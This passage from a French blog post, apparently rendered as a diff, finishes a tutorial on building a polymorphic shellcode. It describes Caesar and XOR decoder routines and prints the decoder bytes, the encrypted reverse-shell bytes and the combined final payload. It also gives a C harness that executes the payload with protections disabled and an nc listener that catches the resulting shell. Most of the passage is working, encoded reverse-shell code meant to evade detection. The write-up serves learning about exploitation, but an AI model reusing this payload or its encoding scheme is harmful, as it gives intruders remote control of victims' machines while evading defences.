+<p>La fonction <code>manager1</code> va quant à elle se charger d&rsquo;incrémenter nos compteurs et de détecter si l&rsquo;on a atteint la fin de notre shellcode. Si tel est le cas le programme passera à la fonction <code>reset</code>, sinon, le programme retournera dans <code>router1</code> pour un nouveau tour.</p>
+<p>La fonction <code>reset</code> ré-initialise toutes les variables à l&rsquo;instar de la fonction <code>init</code>.</p>
+<p>La fonction <code>router2</code> fonctionne comme <code>router1</code>. En effet, nous avions chiffré un caractère sur trois avec un cesar et une clef, le second caractère avait été chiffré avec un XOR et une clef différente et enfin le troisième caractère avait été chiffré avec un cesar allant dans le sens opposé du premier et encore avec une nouvelle clef. Cette fonction permet donc de détecter si l&rsquo;on est sur le premier, deuxième ou troisième caractère et de diriger le programme vers la bonne fonction de déchiffrement.</p>
+<p>Les fonctions <code>decipherCesarPlus</code> et <code>decipherCesarMinus</code> vont se charger d&rsquo;effectuer le déchiffrement de cesar avec leurs clefs respectives.</p>
+<p>De même, la fonction <code>decipherXOR</code> va se charger de déchiffrer le XOR avec la clef lui correspondant.</p>
+<p>Enfin, arrive la fonction <code>manager2</code> qui, comme <code>manager1</code>, va se charger d&rsquo;incrémenter nos compteurs et de détecter si l&rsquo;on a atteint la fin de notre shellcode. Si tel est le cas le programme ira à l&rsquo;adresse de notre shellcode décodé afin de l&rsquo;exécuter, sinon, le programme retournera dans <code>router2</code> pour un nouveau tour.</p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>Warning<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Il est à noter que si l&rsquo;on change les clefs dans le programme de chiffrement il faudra également changer les clefs dans ce programme.</div>
+        </div>
+    </div>
+<p>Nous pouvons compiler notre code :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>nasm -f elf64 decipherShellcode.asm
+<span class="ln">2</span>ld decipherShellcode.o -o decipherShellcode
+</code></pre></div><p>Contrairement au code assembleur de notre reverse shell, nous ne pourrons pas exécuter ce code. Ou plus précisément, nous pourrons, mais cela générera un segfault puisque nous n&rsquo;avons pas notre shellcode chiffré sur la stack.</p>
+<p>Nous pouvons donc directement récupérer le shellcode correspondant à notre programme :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="k">for</span> i in <span class="sb">`</span>objdump -D decipherShellcode <span class="p">|</span> tr <span class="s1">&#39;\t&#39;</span> <span class="s1">&#39; &#39;</span> <span class="p">|</span> tr <span class="s1">&#39; &#39;</span> <span class="s1">&#39;\n&#39;</span> <span class="p">|</span> egrep <span class="s1">&#39;^[0-9a-f]{2}$&#39;</span> <span class="sb">`</span> <span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;\x</span><span class="nv">$i</span><span class="s2">&#34;</span> <span class="p">;</span> <span class="k">done</span> <span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div><p>Le résultat nous indique :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="se">\x</span>eb<span class="se">\x</span>5c<span class="se">\x</span>5e<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b1<span class="se">\x</span>66<span class="se">\x</span>fe<span class="se">\x</span>c2<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>02<span class="se">\x</span>74<span class="se">\x</span>06<span class="se">\x</span>c0<span class="se">\x</span>0c<span class="se">\x</span>1e<span class="se">\x</span>03<span class="se">\x</span>eb<span class="se">\x</span>07<span class="se">\x</span>c0<span class="se">\x</span>0c<span class="se">\x</span>1e<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>01<span class="se">\x</span>80<span class="se">\x</span>e9<span class="se">\x</span>01<span class="se">\x</span>71<span class="se">\x</span>e4<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b1<span class="se">\x</span>66<span class="se">\x</span>fe<span class="se">\x</span>c2<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>02<span class="se">\x</span>74<span class="se">\x</span>0b<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>03<span class="se">\x</span>74<span class="se">\x</span>0c<span class="se">\x</span>80<span class="se">\x</span>2c<span class="se">\x</span>1e<span class="se">\x</span>0d<span class="se">\x</span>eb<span class="se">\x</span>0d<span class="se">\x</span>80<span class="se">\x</span>34<span class="se">\x</span>1e<span class="se">\x</span>07<span class="se">\x</span>eb<span class="se">\x</span>07<span class="se">\x</span>80<span class="se">\x</span>04<span class="se">\x</span>1e<span class="se">\x</span>12<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>01<span class="se">\x</span>80<span class="se">\x</span>e9<span class="se">\x</span>01<span class="se">\x</span>71<span class="se">\x</span>d9<span class="se">\x</span>ff<span class="se">\x</span>e6<span class="se">\x</span>e8<span class="se">\x</span>9f<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff
+</code></pre></div><h3 id="exécution-du-shellcode">Exécution du shellcode</h3>
+<p>Pour vérifier le bon fonctionnement du shellcode, nous allons utiliser un petit programme en C qui simulera son exécution.</p>
+<p>Voici le code C en question :</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="ln"> 1</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="ln"> 2</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="ln"> 3</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span><span class="ln"> 4</span><span class="cp"></span>
+<span class="ln"> 5</span><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="ln"> 6</span>  <span class="s">&#34;</span><span class="se">\xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48</span><span class="s">&#34;</span>
+<span class="ln"> 7</span>  <span class="s">&#34;</span><span class="se">\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74</span><span class="s">&#34;</span>
+<span class="ln"> 8</span>  <span class="s">&#34;</span><span class="se">\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e</span><span class="s">&#34;</span>
+<span class="ln"> 9</span>  <span class="s">&#34;</span><span class="se">\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01</span><span class="s">&#34;</span>
+<span class="ln">10</span>  <span class="s">&#34;</span><span class="se">\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31</span><span class="s">&#34;</span>
+<span class="ln">11</span>  <span class="s">&#34;</span><span class="se">\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b</span><span class="s">&#34;</span>
+<span class="ln">12</span>  <span class="s">&#34;</span><span class="se">\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb</span><span class="s">&#34;</span>
+<span class="ln">13</span>  <span class="s">&#34;</span><span class="se">\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e</span><span class="s">&#34;</span>
+<span class="ln">14</span>  <span class="s">&#34;</span><span class="se">\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01</span><span class="s">&#34;</span>
+<span class="ln">15</span>  <span class="s">&#34;</span><span class="se">\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff\xab</span><span class="s">&#34;</span>
+<span class="ln">16</span>  <span class="s">&#34;</span><span class="se">\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b</span><span class="s">&#34;</span>
+<span class="ln">17</span>  <span class="s">&#34;</span><span class="se">\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f</span><span class="s">&#34;</span>
+<span class="ln">18</span>  <span class="s">&#34;</span><span class="se">\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed</span><span class="s">&#34;</span>
+<span class="ln">19</span>  <span class="s">&#34;</span><span class="se">\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54</span><span class="s">&#34;</span>
+<span class="ln">20</span>  <span class="s">&#34;</span><span class="se">\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0</span><span class="s">&#34;</span>
+<span class="ln">21</span>  <span class="s">&#34;</span><span class="se">\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a</span><span class="s">&#34;</span>
+<span class="ln">22</span>  <span class="s">&#34;</span><span class="se">\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd</span><span class="s">&#34;</span>
+<span class="ln">23</span>  <span class="s">&#34;</span><span class="se">\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2</span><span class="s">&#34;</span>
+<span class="ln">24</span>  <span class="s">&#34;</span><span class="se">\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1</span><span class="s">&#34;</span>
+<span class="ln">25</span>  <span class="s">&#34;</span><span class="se">\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1</span><span class="s">&#34;</span>
+<span class="ln">26</span>  <span class="s">&#34;</span><span class="se">\xbf\x90</span><span class="s">&#34;</span><span class="p">;</span>
+<span class="ln">27</span>
+<span class="ln">28</span><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+<span class="ln">29</span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Shellcode length : %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+<span class="ln">30</span>    
+<span class="ln">31</span>    <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="ln">32</span>    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))();</span>
+<span class="ln">33</span><span class="p">}</span>
+</code></pre></div><p>Comme vous pouvez le voir, le shellcode du décodeur a été concaténé devant le shellcode chiffré afin de former un unique shellcode final :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>Shellcode du décodeur : <span class="se">\x</span>eb<span class="se">\x</span>5c<span class="se">\x</span>5e<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b1<span class="se">\x</span>66<span class="se">\x</span>fe<span class="se">\x</span>c2<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>02<span class="se">\x</span>74<span class="se">\x</span>06<span class="se">\x</span>c0<span class="se">\x</span>0c<span class="se">\x</span>1e<span class="se">\x</span>03<span class="se">\x</span>eb<span class="se">\x</span>07<span class="se">\x</span>c0<span class="se">\x</span>0c<span class="se">\x</span>1e<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>01<span class="se">\x</span>80<span class="se">\x</span>e9<span class="se">\x</span>01<span class="se">\x</span>71<span class="se">\x</span>e4<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b1<span class="se">\x</span>66<span class="se">\x</span>fe<span class="se">\x</span>c2<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>02<span class="se">\x</span>74<span class="se">\x</span>0b<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>03<span class="se">\x</span>74<span class="se">\x</span>0c<span class="se">\x</span>80<span class="se">\x</span>2c<span class="se">\x</span>1e<span class="se">\x</span>0d<span class="se">\x</span>eb<span class="se">\x</span>0d<span class="se">\x</span>80<span class="se">\x</span>34<span class="se">\x</span>1e<span class="se">\x</span>07<span class="se">\x</span>eb<span class="se">\x</span>07<span class="se">\x</span>80<span class="se">\x</span>04<span class="se">\x</span>1e<span class="se">\x</span>12<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>01<span class="se">\x</span>80<span class="se">\x</span>e9<span class="se">\x</span>01<span class="se">\x</span>71<span class="se">\x</span>d9<span class="se">\x</span>ff<span class="se">\x</span>e6<span class="se">\x</span>e8<span class="se">\x</span>9f<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff
+<span class="ln">2</span>
+<span class="ln">3</span>Shellcode chiffré : <span class="se">\x</span>ab<span class="se">\x</span>0f<span class="se">\x</span>7f<span class="se">\x</span>e2<span class="se">\x</span>1b<span class="se">\x</span>8a<span class="se">\x</span>ab<span class="se">\x</span>af<span class="se">\x</span>ba<span class="se">\x</span>6e<span class="se">\x</span>6b<span class="se">\x</span>1e<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>06<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>9c<span class="se">\x</span>6a<span class="se">\x</span>36<span class="se">\x</span>7f<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>bd<span class="se">\x</span>6a<span class="se">\x</span>16<span class="se">\x</span>87<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>d5<span class="se">\x</span>ed<span class="se">\x</span>c5<span class="se">\x</span>ef<span class="se">\x</span>42<span class="se">\x</span>7a<span class="se">\x</span>e3<span class="se">\x</span>fe<span class="se">\x</span>b6<span class="se">\x</span>ff<span class="se">\x</span>aa<span class="se">\x</span>54<span class="se">\x</span>44<span class="se">\x</span>89<span class="se">\x</span>e9<span class="se">\x</span>bb<span class="se">\x</span>9a<span class="se">\x</span>7a<span class="se">\x</span>e3<span class="se">\x</span>6e<span class="se">\x</span>f6<span class="se">\x</span>c0<span class="se">\x</span>83<span class="se">\x</span>10<span class="se">\x</span>c6<span class="se">\x</span>f1<span class="se">\x</span>3e<span class="se">\x</span>f4<span class="se">\x</span>c5<span class="se">\x</span>40<span class="se">\x</span>7e<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>a5<span class="se">\x</span>b7<span class="se">\x</span>31<span class="se">\x</span>bf<span class="se">\x</span>90<span class="se">\x</span>e8<span class="se">\x</span>67<span class="se">\x</span>7a<span class="se">\x</span>bd<span class="se">\x</span>e1<span class="se">\x</span>e0<span class="se">\x</span>40<span class="se">\x</span>b1<span class="se">\x</span>99<span class="se">\x</span>41<span class="se">\x</span>a3<span class="se">\x</span>7b<span class="se">\x</span>cd<span class="se">\x</span>e2<span class="se">\x</span>87<span class="se">\x</span>a3<span class="se">\x</span>ca<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>27<span class="se">\x</span>6c<span class="se">\x</span>82<span class="se">\x</span>c6<span class="se">\x</span>f1<span class="se">\x</span>ba<span class="se">\x</span>b1<span class="se">\x</span>53<span class="se">\x</span>d9<span class="se">\x</span>42<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>75<span class="se">\x</span>b7<span class="se">\x</span>e1<span class="se">\x</span>bf<span class="se">\x</span><span class="m">90</span>
+<span class="ln">4</span>
+<span class="ln">5</span>Shellcode final : <span class="se">\x</span>eb<span class="se">\x</span>5c<span class="se">\x</span>5e<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b1<span class="se">\x</span>66<span class="se">\x</span>fe<span class="se">\x</span>c2<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>02<span class="se">\x</span>74<span class="se">\x</span>06<span class="se">\x</span>c0<span class="se">\x</span>0c<span class="se">\x</span>1e<span class="se">\x</span>03<span class="se">\x</span>eb<span class="se">\x</span>07<span class="se">\x</span>c0<span class="se">\x</span>0c<span class="se">\x</span>1e<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>01<span class="se">\x</span>80<span class="se">\x</span>e9<span class="se">\x</span>01<span class="se">\x</span>71<span class="se">\x</span>e4<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b1<span class="se">\x</span>66<span class="se">\x</span>fe<span class="se">\x</span>c2<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>02<span class="se">\x</span>74<span class="se">\x</span>0b<span class="se">\x</span>80<span class="se">\x</span>fa<span class="se">\x</span>03<span class="se">\x</span>74<span class="se">\x</span>0c<span class="se">\x</span>80<span class="se">\x</span>2c<span class="se">\x</span>1e<span class="se">\x</span>0d<span class="se">\x</span>eb<span class="se">\x</span>0d<span class="se">\x</span>80<span class="se">\x</span>34<span class="se">\x</span>1e<span class="se">\x</span>07<span class="se">\x</span>eb<span class="se">\x</span>07<span class="se">\x</span>80<span class="se">\x</span>04<span class="se">\x</span>1e<span class="se">\x</span>12<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>01<span class="se">\x</span>80<span class="se">\x</span>e9<span class="se">\x</span>01<span class="se">\x</span>71<span class="se">\x</span>d9<span class="se">\x</span>ff<span class="se">\x</span>e6<span class="se">\x</span>e8<span class="se">\x</span>9f<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ab<span class="se">\x</span>0f<span class="se">\x</span>7f<span class="se">\x</span>e2<span class="se">\x</span>1b<span class="se">\x</span>8a<span class="se">\x</span>ab<span class="se">\x</span>af<span class="se">\x</span>ba<span class="se">\x</span>6e<span class="se">\x</span>6b<span class="se">\x</span>1e<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>06<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>9c<span class="se">\x</span>6a<span class="se">\x</span>36<span class="se">\x</span>7f<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>bd<span class="se">\x</span>6a<span class="se">\x</span>16<span class="se">\x</span>87<span class="se">\x</span>aa<span class="se">\x</span>b1<span class="se">\x</span>d5<span class="se">\x</span>ed<span class="se">\x</span>c5<span class="se">\x</span>ef<span class="se">\x</span>42<span class="se">\x</span>7a<span class="se">\x</span>e3<span class="se">\x</span>fe<span class="se">\x</span>b6<span class="se">\x</span>ff<span class="se">\x</span>aa<span class="se">\x</span>54<span class="se">\x</span>44<span class="se">\x</span>89<span class="se">\x</span>e9<span class="se">\x</span>bb<span class="se">\x</span>9a<span class="se">\x</span>7a<span class="se">\x</span>e3<span class="se">\x</span>6e<span class="se">\x</span>f6<span class="se">\x</span>c0<span class="se">\x</span>83<span class="se">\x</span>10<span class="se">\x</span>c6<span class="se">\x</span>f1<span class="se">\x</span>3e<span class="se">\x</span>f4<span class="se">\x</span>c5<span class="se">\x</span>40<span class="se">\x</span>7e<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>a5<span class="se">\x</span>b7<span class="se">\x</span>31<span class="se">\x</span>bf<span class="se">\x</span>90<span class="se">\x</span>e8<span class="se">\x</span>67<span class="se">\x</span>7a<span class="se">\x</span>bd<span class="se">\x</span>e1<span class="se">\x</span>e0<span class="se">\x</span>40<span class="se">\x</span>b1<span class="se">\x</span>99<span class="se">\x</span>41<span class="se">\x</span>a3<span class="se">\x</span>7b<span class="se">\x</span>cd<span class="se">\x</span>e2<span class="se">\x</span>87<span class="se">\x</span>a3<span class="se">\x</span>ca<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>27<span class="se">\x</span>6c<span class="se">\x</span>82<span class="se">\x</span>c6<span class="se">\x</span>f1<span class="se">\x</span>ba<span class="se">\x</span>b1<span class="se">\x</span>53<span class="se">\x</span>d9<span class="se">\x</span>42<span class="se">\x</span>aa<span class="se">\x</span>c6<span class="se">\x</span>75<span class="se">\x</span>b7<span class="se">\x</span>e1<span class="se">\x</span>bf<span class="se">\x</span><span class="m">90</span>
+</code></pre></div><p>Nous pouvons compiler notre code :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>gcc -z execstack -fno-stack-protector -fno-pie -z norelro -fPIC testShellcode.c -o testShellcode
+</code></pre></div><p>Les flags de compilations indiqués permettent de supprimer des protections. Cependant, je ne rentrerais pas dans ces détails ici puisque ce n&rsquo;est pas l&rsquo;objectif du post.</p>
+<p>Nous devons ouvrir un port sur notre machine à l&rsquo;adresse que nous avons indiquée dans notre programme :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>nc -l 127.1.10.100 <span class="m">31337</span> -v
+</code></pre></div><p>Puis, nous exécutons notre programme :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>./testShellcode 
+</code></pre></div><p>Nous obtenons alors une connexion entrante sur notre port et nous pouvons exécuter les mêmes commandes que dans un terminal.</p>
+<p>Notre shellcode polymorphique est fonctionnel !</p>
+<p>Vous pouvez retrouver la totalité du projet sur mon GitHub : <a href="https://github.com/Nyxott/ShellcodePolymorphique" target="_blank" rel="noopener noreffer">https://github.com/Nyxott/ShellcodePolymorphique</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 01-07-2020</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://nyxott.github.io/posts/shellcode-polymorphique/" data-title="Shellcode Polymorphique" data-hashtags="Projects"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://nyxott.github.io/posts/shellcode-polymorphique/" data-hashtag="Projects"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://nyxott.github.io/posts/shellcode-polymorphique/"><i class="fab fa-linkedin fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://nyxott.github.io/posts/shellcode-polymorphique/" data-title="Shellcode Polymorphique"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://nyxott.github.io/posts/shellcode-polymorphique/"><i class="fab fa-reddit fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/projects/">Projects</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/asm/" class="prev" rel="prev" title="L&#39;assembleur"><i class="fas fa-angle-left fa-fw"></i>L&#39;assembleur</a>
+            <a href="/posts/coffre-fort-numerique-distant/" class="next" rel="next" title="Coffre-Fort Numérique Distant">Coffre-Fort Numérique Distant<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Nyxott</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"Nyxott's blog","id-2":"Nyxott's blog"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
